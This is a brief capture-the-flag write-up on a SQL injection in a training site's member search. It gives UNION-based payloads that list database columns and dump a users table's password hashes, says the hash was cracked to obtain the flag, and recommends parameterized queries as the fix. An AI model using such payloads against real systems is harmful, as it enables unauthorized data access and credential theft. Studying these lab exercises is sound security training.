## 3- SQL INJECTION IN MEMBER SEARCH 
### How to reproduce :
When we enter an argument that is not an integer in the search bar, we receive this message :
`Unknown column 'asdasdasd' in 'where clause'`
its mean that the sql query is something like this:
`SELECT * FROM members WHERE id = INPUT`
So we can exploit it by add a new query

we can use this to show the all columns in the tables:
`0 OR 0=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns`
and now we can see the all columns from all tables
and with this query we can see the value of the `Commentaire,countersign` for all users
`0 OR 0=0 UNION SELECT Commentaire,countersign FROM users`
in Commentaire we found: `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
and in countersign we found: `5ff9d0165b4f92b14994e5c685cdce28`
So we decrypt it and we encrypt it to sha256 like what they said
and we get the flag.
### How to Fix :
We should prepare the query before executing it or use parametrized queries or use Input validation.
Or use a tool like PDO in php or entity framework in .NET
